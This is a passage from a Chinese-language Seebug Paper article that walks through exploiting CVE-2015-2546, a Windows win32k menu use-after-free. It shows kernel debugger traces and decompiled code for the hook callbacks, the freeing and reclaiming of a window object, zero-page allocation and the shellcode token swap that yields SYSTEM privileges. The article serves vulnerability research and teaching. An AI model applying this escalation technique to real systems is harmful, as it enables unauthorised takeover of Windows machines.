<p>这个第三个第四个特定参数都是0x00，那么我觉得这个可能和MNMouseMove中的值有关，于是我尝试修改了CVE-2015-2546中PostMessage消息传递的特定参数。</p>
<p>修改之后，我们重新跟踪调试。</p>
<div class="codehilite"><pre><span></span>kd&gt; p
win32k!xxxHandleMenuMessages+0x21:
90668d99 8b5608          mov     edx,dword ptr <span class="o">[</span>esi+8<span class="o">]</span>
kd&gt; p
win32k!xxxHandleMenuMessages+0x24:
90668d9c 8b5e0c          mov     ebx,dword ptr <span class="o">[</span>esi+0Ch<span class="o">]</span>
kd&gt; p
win32k!xxxHandleMenuMessages+0x27:
90668d9f b904010000      mov     ecx,104h
kd&gt; r edx
<span class="nv">edx</span><span class="o">=</span><span class="m">00110011</span>
kd&gt; r ebx
<span class="nv">ebx</span><span class="o">=</span><span class="m">00110011</span>
</pre></div>


<p>果然这个值可控了，而且esi指针的值就+4h是PostMessage第二个参数，+08h是第三个参数，+0Ch是第四个参数，接下来，MNMouseMove也能够正常进入if语句的处理流程了。</p>
<div class="codehilite"><pre><span></span>kd&gt; p
win32k!xxxHandleMenuMessages+0x2e8:
<span class="m">90669061</span> e889030000      call    win32k!xxxMNMouseMove <span class="o">(</span>906693ef<span class="o">)</span>
kd&gt; dd esp
85d07a98  fde8da68 9074f580 <span class="m">00110011</span> 9074f580
kd&gt; p
win32k!xxxMNMouseMove+0x1f:
9066940e 3b4708          cmp     eax,dword ptr <span class="o">[</span>edi+8<span class="o">]</span>
kd&gt; p
win32k!xxxMNMouseMove+0x22:
<span class="m">90669411</span> <span class="m">7511</span>            jne     win32k!xxxMNMouseMove+0x35 <span class="o">(</span><span class="m">90669424</span><span class="o">)</span>
kd&gt; r eax
<span class="nv">eax</span><span class="o">=</span><span class="m">00000011</span>
kd&gt; p
win32k!xxxMNMouseMove+0x35:
<span class="m">90669424</span> <span class="m">894708</span>          mov     dword ptr <span class="o">[</span>edi+8<span class="o">]</span>,eax
</pre></div>


<h3>在HOOK中挣扎和Exploit</h3>
<p>接下来，进入到消息钩子部分，主要处理的还是SendMessage异步处理时的消息，通过修改返回，最后达到漏洞调用位置，通过IDA pro来跟踪一下MNMouseMove的执行流程，以及跟CVE-2015-2546有关的部分。</p>
<div class="codehilite"><pre><span></span><span class="kt">void</span> <span class="kr">__stdcall</span> <span class="nf">xxxMNMouseMove</span><span class="p">(</span><span class="n">WCHAR</span> <span class="n">UnicodeString</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a2</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a3</span><span class="p">)</span>
<span class="p">{</span>
  <span class="err">……</span>
    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">signed</span> <span class="kr">__int16</span><span class="p">)</span><span class="n">a3</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a2</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">||</span> <span class="n">SHIWORD</span><span class="p">(</span><span class="n">a3</span><span class="p">)</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a2</span> <span class="o">+</span> <span class="mi">12</span><span class="p">)</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a2</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="kt">signed</span> <span class="kr">__int16</span><span class="p">)</span><span class="n">a3</span><span class="p">;</span>
      <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v5</span> <span class="o">+</span> <span class="mi">12</span><span class="p">)</span> <span class="o">=</span> <span class="n">SHIWORD</span><span class="p">(</span><span class="n">v4</span><span class="p">);</span>
      <span class="n">v6</span> <span class="o">=</span> <span class="n">xxxMNFindWindowFromPoint</span><span class="p">(</span><span class="n">v3</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">UnicodeString</span><span class="p">,</span> <span class="n">v4</span><span class="p">);</span><span class="c1">// V6通过HOOK可控，这里的sendmessage是异步处理</span>
      <span class="n">v7</span> <span class="o">=</span> <span class="n">v6</span><span class="p">;</span>                                  <span class="c1">// v7可控</span>
      <span class="err">……</span>
      <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v5</span> <span class="o">+</span> <span class="mi">16</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>          <span class="c1">// 这个外层if不一定会进来</span>
      <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v7</span> <span class="o">||</span> <span class="n">v7</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v3</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="mi">35</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x20</span> <span class="p">)</span><span class="c1">// 判断返回值是0或者-1</span>
          <span class="k">return</span><span class="p">;</span>
        <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v5</span> <span class="o">+</span> <span class="mi">16</span><span class="p">)</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">v7</span> <span class="o">==</span> <span class="o">-</span><span class="mi">5</span> <span class="p">)</span>                           <span class="c1">// 当返回值是0xffffffb</span>
      <span class="p">{</span>
<span class="err">……</span>
      <span class="p">}</span>
      <span class="k">else</span>                                      <span class="c1">// 否则进入这里</span>
      <span class="p">{</span>
         <span class="err">……</span>
          <span class="n">v9</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">**</span><span class="p">)(</span><span class="n">v7</span> <span class="o">+</span> <span class="mi">176</span><span class="p">);</span>          <span class="c1">// 获取tagPOPUPMENU的位置，偏移是+0B0h</span>
         <span class="err">……</span>
          <span class="n">v10</span> <span class="o">=</span> <span class="n">xxxSendMessage</span><span class="p">((</span><span class="n">PVOID</span><span class="p">)</span><span class="n">v7</span><span class="p">,</span> <span class="o">-</span><span class="mi">27</span><span class="p">,</span> <span class="n">UnicodeString</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
          <span class="k">if</span> <span class="p">(</span> <span class="n">v10</span> <span class="o">&amp;</span> <span class="mh">0x10</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="p">(</span><span class="n">v10</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">xxxSendMessage</span><span class="p">((</span><span class="n">PVOID</span><span class="p">)</span><span class="n">v7</span><span class="p">,</span> <span class="o">-</span><span class="mi">16</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="p">)</span>
            <span class="n">xxxMNHideNextHierarchy</span><span class="p">(</span><span class="n">v9</span><span class="p">);</span>         <span class="c1">// 漏洞触发关键位置</span>
</pre></div>


<p>经过分析，我们需要处理三处SendMessage的异步过程，第一处在FindWindowFromPoint，这个函数中会有一处SendMessage，通过异步过程执行钩子，但是我调试时发现在进入这个函数返回，但并没有执行钩子。</p>
<div class="codehilite"><pre><span></span>kd&gt; p
win32k!xxxMNMouseMove+0x48:
<span class="m">90669437</span> e862010000      call    win32k!xxxMNFindWindowFromPoint <span class="o">(</span>9066959e<span class="o">)</span>
kd&gt; p
win32k!xxxMNMouseMove+0x4d:
9066943c f7470400800000  <span class="nb">test</span>    dword ptr <span class="o">[</span>edi+4<span class="o">]</span>,8000h
kd&gt; r eax
<span class="nv">eax</span><span class="o">=</span>fea11430
跟踪一下这个过程，我发现在进入SendMessage之前，有一处if语句判断，当这个if语句判断不通过的时候，不会进入SendMessage处理。
kd&gt; p
win32k!xxxMNFindWindowFromPoint+0x14:
906695b2 8b470c          mov     eax,dword ptr <span class="o">[</span>edi+0Ch<span class="o">]</span>
kd&gt; p
win32k!xxxMNFindWindowFromPoint+0x17:
906695b5 85c0            <span class="nb">test</span>    eax,eax
kd&gt; p
win32k!xxxMNFindWindowFromPoint+0x19:
906695b7 746b            je      win32k!xxxMNFindWindowFromPoint+0x86 <span class="o">(</span><span class="m">90669624</span><span class="o">)</span>
kd&gt; p
win32k!xxxMNFindWindowFromPoint+0x86:
<span class="m">90669624</span> 8b07            mov     eax,dword ptr <span class="o">[</span>edi<span class="o">]</span>
kd&gt; dd edi
fde8da68  12a10008 fea38d58 fea11430 <span class="m">00000000</span>
</pre></div>


<p>可以看到这里eax的值是edi+0ch对应的值，也就是0，对应伪代码v5变量值为0，也就是if语句判断没通过，跳转了。这样我们还需要重新看一下这个值，这个值来自于tagPopupMenu结构体，通过CVE-2014-4113和CVE-2015-2546的tagPopupMenu结构体做一个对比。</p>
<div class="codehilite"><pre><span></span>kd&gt; dt tagPOPUPMENU fde8da68//我们的Exploit中的结构体
   +0x004 spwndNotify      : 0xfea38d58 tagWND
   +0x008 spwndPopupMenu   : 0xfea11430 tagWND
   +0x00c spwndNextPopup   : <span class="o">(</span>null<span class="o">)</span> 
kd&gt; dt fde8da68 tagPOPUPMENU//CVE-2014-4113的结构体
   +0x004 spwndNotify      : 0xfea39de8 tagWND
   +0x008 spwndPopupMenu   : 0xfea12398 tagWND
   +0x00c spwndNextPopup   : 0xfea12578 tagWND
</pre></div>


<p>实际上，在通过TrackPopupMenu之后会调用MNLoop进入循环处理消息，而我们的exp中只有一个postmessage，于是我们增加到三个postmessage，再次调试跟踪。</p>
<div class="codehilite"><pre><span></span>kd&gt; p
win32k!xxxHandleMenuMessages+0x2e7:
<span class="m">90669060</span> <span class="m">57</span>              push    edi
kd&gt; p
win32k!xxxHandleMenuMessages+0x2e8:
<span class="m">90669061</span> e889030000      call    win32k!xxxMNMouseMove <span class="o">(</span>906693ef<span class="o">)</span>
kd&gt; r edi
<span class="nv">edi</span><span class="o">=</span>fde8da68
   +0x004 spwndNotify      : 0xfea39d18 tagWND
   +0x008 spwndPopupMenu   : 0xfea11430 tagWND
   +0x00c spwndNextPopup   : 0xfea12698 tagWND
</pre></div>


<p>这样，我们就能够处理了，接下来利用三个钩子，分别处理三种消息的调用，这个调用过程和CVE-2014-4113相比差别还是比较大的。需要来看一下最关键的钩子该怎么用。首先我们要分析一下和漏洞利用最关键的函数xxxMNHideNextHierarchy，这个函数有一个参数。</p>
<div class="codehilite"><pre><span></span><span class="kt">signed</span> <span class="kt">int</span> <span class="kr">__stdcall</span> <span class="nf">xxxMNHideNextHierarchy</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">)</span>
  <span class="n">v1</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">12</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">v2</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">12</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">v2</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">28</span><span class="p">)</span> <span class="p">)</span>
      <span class="n">xxxSendMessage</span><span class="p">(</span><span class="n">v2</span><span class="p">,</span> <span class="o">-</span><span class="mi">28</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span><span class="c1">//这里调用shellcode提权</span>
</pre></div>


<p>这个参数a1直接影响到后面的提权，回到外层看一下这个a1从哪里来。</p>
<div class="codehilite"><pre><span></span><span class="n">v6</span> <span class="o">=</span> <span class="n">xxxMNFindWindowFromPoint</span><span class="p">(</span><span class="n">v3</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">UnicodeString</span><span class="p">,</span> <span class="n">v4</span><span class="p">);</span><span class="c1">// V6通过HOOK可控，这里的sendmessage是异步处理</span>
      <span class="n">v7</span> <span class="o">=</span> <span class="n">v6</span><span class="p">;</span>                                  <span class="c1">// v7可控</span>
      <span class="err">……</span>
      <span class="n">v9</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">**</span><span class="p">)(</span><span class="n">v7</span> <span class="o">+</span> <span class="mi">176</span><span class="p">);</span>          <span class="c1">// 获取tagPOPUPMENU的位置，偏移是+0B0h</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">v10</span> <span class="o">&amp;</span> <span class="mh">0x10</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="p">(</span><span class="n">v10</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">xxxSendMessage</span><span class="p">((</span><span class="n">PVOID</span><span class="p">)</span><span class="n">v7</span><span class="p">,</span> <span class="o">-</span><span class="mi">16</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="p">)</span>
            <span class="n">xxxMNHideNextHierarchy</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">v9</span><span class="p">);</span>    <span class="c1">// 漏洞触发关键位置</span>
</pre></div>


<p>正是从MNFindWindowFromPoint而来，本来是一次轻松愉快的旅程，但是实际上在逻辑代码中，有一个地方导致了这次旅程血崩，就是：</p>
<div class="codehilite"><pre><span></span><span class="k">if</span> <span class="p">(</span> <span class="n">IsWindowBeingDestroyed</span><span class="p">(</span><span class="n">v7</span><span class="p">)</span> <span class="p">)</span>
            <span class="k">return</span><span class="p">;</span>
</pre></div>


<p>这个地方会对窗口的属性进行检查，也就是说，v7不能是一个任意值，比如是我们直接通过零页分配的shellcode的某个地址指针，如果可以的话，后面就会导致其他的利用了，因此这个值必须是一个窗口的值，因此我们用一种方法：</p>
<p>就是创建窗口A和窗口B，在这里通过异步调用，返回窗口B的值，这样后续处理中，就会将窗口B的tagMenu偏移+0B0h位置的值，也就是tagPopupMenu交给v9，那么随后在最后一个SendMessage中销毁窗口B，通过一些方法将销毁后的位置占位，因为后面没有进行判断，从而可以调用占位后的值。而通过分析xxxMNHideNextHierarchy，内层函数用的是tagPopupMenu-&gt;spwndNextPopup，因此，只要在占位时再控制这个值，为一个我们可控的值，最后就能在xxxMNHideNextHierarchy里的sendmessage完成最后一步提权了。</p>
<p>有了这个思路，我们开始利用钩子来完成这个过程。第一步，在FindWindowFromMessage函数调用中，处理1EB消息，这个和CVE-2014-4113很像。</p>
<div class="codehilite"><pre><span></span><span class="m">90669437</span> e862010000      call    win32k!xxxMNFindWindowFromPoint <span class="o">(</span>9066959e<span class="o">)</span>
win32k!xxxMNMouseMove+0x4d:
9066943c f7470400800000  <span class="nb">test</span>    dword ptr <span class="o">[</span>edi+4<span class="o">]</span>,8000h
kd&gt; r eax
<span class="nv">eax</span><span class="o">=</span>fea396d0
</pre></div>


<p>第一步钩子会返回窗口B的值，这样，也能绕过IsDestroy的判断，随后进入第二步处理，第二步处理的值，是1E5的消息，这个消息返回后会将返回值和0x10做一个判断。</p>
<div class="codehilite"><pre><span></span><span class="nf">xor</span>     <span class="no">edi</span><span class="p">,</span> <span class="no">edi</span>
<span class="nf">push</span>    <span class="no">edi</span>             <span class="c">; Address</span>
<span class="no">push</span>    <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">ebp</span><span class="err">+</span><span class="no">UnicodeString</span><span class="p">]</span> <span class="c">; UnicodeString</span>
<span class="no">push</span>    <span class="mi">1</span><span class="no">E5h</span>            <span class="c">; MbString</span>
<span class="no">push</span>    <span class="no">esi</span>             <span class="c">; P</span>
<span class="no">call</span>    <span class="no">_xxxSendMessage@16</span> <span class="c">; xxxSendMessage(x,x,x,x)</span>
<span class="c">; 67:           if ( v10 &amp; 0x10 &amp;&amp; !(v10 &amp; 3) &amp;&amp; !xxxSendMessage((PVOID)v7, -16, 0, 0) )</span>
<span class="no">test</span>    <span class="no">al</span><span class="p">,</span> <span class="mi">10</span><span class="no">h</span>
<span class="nf">jz</span>      <span class="no">short</span> <span class="no">loc_BF939583</span>
</pre></div>


<p>这样我们控制钩子令返回值为0x10就可以了。</p>
<div class="codehilite"><pre><span></span>kd&gt; p
win32k!xxxMNMouseMove+0x134:
<span class="m">90669523</span> e87500f8ff      call    win32k!xxxSendMessage <span class="o">(</span>905e959d<span class="o">)</span>
kd&gt; g
Breakpoint <span class="m">16</span> hit
win32k!xxxMNMouseMove+0x139:
<span class="m">90669528</span> a810            <span class="nb">test</span>    al,10h
kd&gt; r eax
<span class="nv">eax</span><span class="o">=</span><span class="m">00000010</span>
kd&gt; p
win32k!xxxMNMouseMove+0x13b:
9066952a <span class="m">7457</span>            je      win32k!xxxMNMouseMove+0x194 <span class="o">(</span><span class="m">90669583</span><span class="o">)</span>
</pre></div>


<p>第三步处理1F0的消息，这一步很关键，会调用SendMessage，在这一步的钩子中对窗口B进行销毁，销毁后占位，由于这一步是在一个if语句里，因此需要返回值为0，才能通过非的判断。</p>
<div class="codehilite"><pre><span></span><span class="nl">.text:</span><span class="nf">BF939530</span>                 <span class="no">push</span>    <span class="no">edi</span>             <span class="c">; Address</span>
<span class="no">.text</span><span class="p">:</span><span class="no">BF939531</span>                 <span class="no">push</span>    <span class="no">edi</span>             <span class="c">; UnicodeString</span>
<span class="no">.text</span><span class="p">:</span><span class="no">BF939532</span>                 <span class="no">push</span>    <span class="mi">1</span><span class="no">F0h</span>            <span class="c">; MbString</span>
<span class="no">.text</span><span class="p">:</span><span class="no">BF939537</span>                 <span class="no">push</span>    <span class="no">esi</span>             <span class="c">; P</span>
<span class="no">.text</span><span class="p">:</span><span class="no">BF939538</span>                 <span class="no">call</span>    <span class="no">_xxxSendMessage@16</span> <span class="c">; xxxSendMessage(x,x,x,x)</span>
<span class="no">.text</span><span class="p">:</span><span class="no">BF93953D</span>                 <span class="no">test</span>    <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span>
<span class="nl">.text:</span><span class="nf">BF93953F</span>                 <span class="no">jnz</span>     <span class="no">short</span> <span class="no">loc_BF939583</span>
<span class="nl">.text:</span><span class="nf">BF939541</span> <span class="c">; 68:             xxxMNHideNextHierarchy(v9);         // 漏洞触发关键位置</span>
</pre></div>


<p>这样的话，我们销毁窗口，并且进行占位</p>
<div class="codehilite"><pre><span></span>kd&gt; p
Breakpoint 17 hit
win32k!xxxMNMouseMove+0x14e:
9066953d 85c0            test    eax,eax
kd&gt; p
win32k!xxxMNMouseMove+0x150:
9066953f 7542            jne     win32k!xxxMNMouseMove+0x194 (90669583)
kd&gt; r eax
eax=00000000
kd&gt; p
win32k!xxxMNMouseMove+0x152:
90669541 53              push    ebx
</pre></div>


<p>最后占位后就是处理后的ebx了，这时候我们对ebx后的值也很有讲究，ebx+0Ch的值就是我们最后要调用到的值，这个值刚开始我想是直接按照CVE-2014-4113中的值一样定义成0xfffffffb，但是后来发现，在HideNextHierarchy函数中会将这个值自加进行一个赋值。</p>
<div class="codehilite"><pre><span></span>kd&gt; p
win32k!xxxMNHideNextHierarchy+0x2c:
90648efa ff4004          inc     dword ptr <span class="o">[</span>eax+4<span class="o">]</span>
kd&gt; dd eax
ffffffff  ???????? fe7d2179 <span class="m">00000000</span> <span class="m">00000000</span>
</pre></div>


<p>因此，如果eax的值是0xfffffffb的话，加4之后就是0xffffffff，仍然是个无效地址，这个无效地址自加会导致系统异常，因此，我把eax的值设为0xffffffff，这样同样需要重新分配0页内存。</p>
<div class="codehilite"><pre><span></span>kd&gt; p
win32k!xxxMNHideNextHierarchy+0x9:
90648ed7 8b7508          mov     esi,dword ptr <span class="o">[</span>ebp+8<span class="o">]</span>
kd&gt; p
win32k!xxxMNHideNextHierarchy+0xc:
90648eda 8b460c          mov     eax,dword ptr <span class="o">[</span>esi+0Ch<span class="o">]</span>
kd&gt; p
win32k!xxxMNHideNextHierarchy+0xf:
90648edd 85c0            <span class="nb">test</span>    eax,eax
kd&gt; r eax
<span class="nv">eax</span><span class="o">=</span>ffffffff
</pre></div>


<p>这样就绕过了最后一层判断，最后到达1E4的消息调用，这个地方传递的值就已经是0xffffffff了。</p>
<div class="codehilite"><pre><span></span>kd&gt; p
win32k!xxxMNHideNextHierarchy+0x37:
90648f05 6a00            push    <span class="m">0</span>
kd&gt; p
win32k!xxxMNHideNextHierarchy+0x39:
90648f07 6a00            push    <span class="m">0</span>
kd&gt; p
win32k!xxxMNHideNextHierarchy+0x3b:
90648f09 68e4010000      push    1E4h
kd&gt; p
win32k!xxxMNHideNextHierarchy+0x40:
90648f0e <span class="m">50</span>              push    eax
kd&gt; r @eax<span class="o">=</span>ffffffff
kd&gt; p
win32k!xxxMNHideNextHierarchy+0x41:
90648f0f e88906faff      call    win32k!xxxSendMessage <span class="o">(</span>905e959d<span class="o">)</span>
kd&gt; dd esp
92dd3a3c  ffffffff 000001e4 <span class="m">00000000</span> <span class="m">00000000</span>
</pre></div>


<p>接下来向内层继续传递，和CVE-2014-4113的利用过程就基本一致了。</p>
<div class="codehilite"><pre><span></span>kd&gt; p
win32k!xxxSendMessage+0x23:
905e95c0 e882fdffff      call    win32k!xxxSendMessageTimeout <span class="o">(</span>905e9347<span class="o">)</span>
kd&gt; dd esp
92dd3a14  ffffffff 000001e4 <span class="m">00000000</span> <span class="m">00000000</span>
</pre></div>


<p>最后，执行到shellcode</p>
<div class="codehilite"><pre><span></span>kd&gt; p
win32k!xxxSendMessageTimeout+0x1a9:
905e94f0 ff5660          call    dword ptr <span class="o">[</span>esi+60h<span class="o">]</span>
kd&gt; r esi
<span class="nv">esi</span><span class="o">=</span>ffffffff
kd&gt; dd esi+60
0000005f  <span class="m">00371410</span> <span class="m">00000000</span> <span class="m">00000000</span> <span class="m">00000000</span>
kd&gt; p
Breakpoint <span class="m">6</span> hit
<span class="m">00371410</span> <span class="m">55</span>              push    ebp
</pre></div>


<p>下一个写入断点</p>
<div class="codehilite"><pre><span></span>kd&gt; !process 0 0
**** NT ACTIVE PROCESS DUMP ****
PROCESS 841bdab0  SessionId: none  Cid: 0004    Peb: 00000000  ParentCid: 0000
    DirBase: 00185000  ObjectTable: 87c01be8  HandleCount: 490.
    Image: System
PROCESS 845da8a8  SessionId: 1  Cid: 0ddc    Peb: 7ffdf000  ParentCid: 0cf8
    DirBase: 3f321500  ObjectTable: 95b440f0  HandleCount:  28.
    Image: EoP_1.exe
kd&gt; dd 845da8a8+f8
845da9a0  86094613 000078da 00000000 00000000原进程token
shellcode进行替换
kd&gt; dd 845da8a8+f8 //提权Token
845da9a0  87c01337 000078da 00000000 00000000
kd&gt; dd 841bdab0+f8 //系统Token
841bdba8  87c01337 00000000 00000000 00000000
</pre></div>


<p>现在是system的token了，最后放一个提权后的截图</p>
<p><img alt="" src="https://images.seebug.org/content/images/2016/11/t018b3c1c2863cb773b.png-w331s" /></p>
<h3>后记</h3>
<p>这个漏洞总体来说可以算是CVE-2014-4113的进阶，和内核较劲的过程非常有意思，一步步的思考和绕过，让我想起以前膜拜大牛们过狗的案例中一步步bypass的过程，实际上二进制也是一样。</p>
<p>那么这篇文章也写到这里，希望大牛们多多批评指正，也希望大家也都能有所收获，谢谢！</p>
      
<hr>
<p><img src="https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg" alt="Paper" style="width: 220px">
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<a href="https://paper.seebug.org/111/">https://paper.seebug.org/111/</a></p>
            
    </section>

  <nav class="pagination" role="navigation" style="padding: 3rem;">
    
      <a class="newer-posts" href="/110/"><span aria-hidden="true">&larr;</span> NoSQLAttack - 一款针对 mongoDB ...</a>
    
    
      <a class="older-posts" href="/113/">Layer 子域名挖掘机4.1 全新重构 + 175万大字典 <span aria-hidden="true">&rarr;</span></a>
    
  </nav>


    

      
    
    <br>
    <section class="plugin_comment">
    </section>

  </article>
  <section class="plugin_feedback"></section>


  </div>
</main>
</div>

<script type="text/javascript" src="/static/js/jquery.min.js"></script>
<script type="text/javascript" src="/static/js/jquery.fitvids.js"></script>
<script type="text/javascript" src="/static/js/index.js"></script>
<script type="text/javascript" src="/static/js/prism-loader.js"></script>
<script type="text/javascript" src="/static/js/prism.js"></script>
<script type="text/javascript" src="/static/js/jquery.ghostHunter.js"></script>
<script type="text/javascript" src="/static/js/js.cookie.js"></script>
<script type="text/javascript" src="/static/js/custom.js?t=20170821"></script>
<script type="text/javascript" src="https://www.seebug.org/static/dist2/scripts/comment_main.js"></script>
<script type="text/javascript" src="https://www.seebug.org/static/dist2/scripts/plugin_feedback.js"></script>
</body>

</html>
